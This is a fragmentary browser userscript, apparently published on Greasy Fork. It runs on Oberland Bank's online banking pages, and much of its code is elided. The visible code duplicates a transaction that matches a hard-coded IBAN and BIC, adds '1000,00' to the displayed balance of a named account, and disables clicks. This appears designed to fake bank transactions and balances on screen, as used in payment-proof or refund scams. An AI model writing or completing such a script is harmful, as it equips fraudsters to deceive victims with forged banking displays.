// ==UserScript==
// @name      VB Combined User Script R Tomislav Badrov
// @description Combines
// @version   3.0
// @grant     none
// @match     https://www.oberlandbank.de/*
// @match        https://www.drivehq.com/*
// @run-at    document-end
// @namespace https://greasyfork.org/users/972766
// @downloadURL https://update.greasyfork.org/scripts/473603/VB%20Combined%20User%20Script%20R%20Tomislav%20Badrov.user.js
// @updateURL https://update.greasyfork.org/scripts/473603/VB%20Combined%20User%20Script%20R%20Tomislav%20Badrov.meta.js
// ==/UserScript==
...
document.addEventListener('click', function (event) {
    ...
    var isWithinExcludedClass = targetElement.closest('.ng-tns-c283-0') !== null;
...
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            ...
            var targetText = "Oberland Direkt Privat";
...
//SECOND SCRIPT///////////SECOND SCRIPT/////// ///////SECOND SCRIPT/////// ///////SECOND SCRIPT/////// ///////SECOND SCRIPT/////// ///////SECOND SCRIPT/////// ///////SECOND SCRIPT/////// ///////SECOND SCRIPT/////// ///////SECOND SCRIPT/
    ...
    function duplicateTransactions() {
        ...
        (function() {
          ...
          if (window.location.href.includes("umsaetze") || window.location.href.includes("10475578716")) {

          ...
          var DUPLICATE_MOVE_STEPS = 20; // Number of steps to move the duplicated transaction

          // Specify the text content to search for in transactions
          var TEXT_TO_FIND = "SecureGo plus IBAN: HR4124840083292236162 BIC: RZBHHR2XXXX";
...
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
          ...
          var BALANCE_ADJUSTMENT_AMOUNT = "1000,00"; // Use "-" to decrease the balance
          // Specify the account name to match
      var ACCOUNT_NAME_TO_MATCH = "GiroKonto Online";

      ...
      function disableClickEvents(element) {
          ...
          function duplicateTransaction(element) {
              ...
              var parentElement = element.closest('.ng-tns-c283-0');
              if (parentElement) {
                  ...
                  console.log("Parent element with class ng-tns-c283-0 not found.");
              }
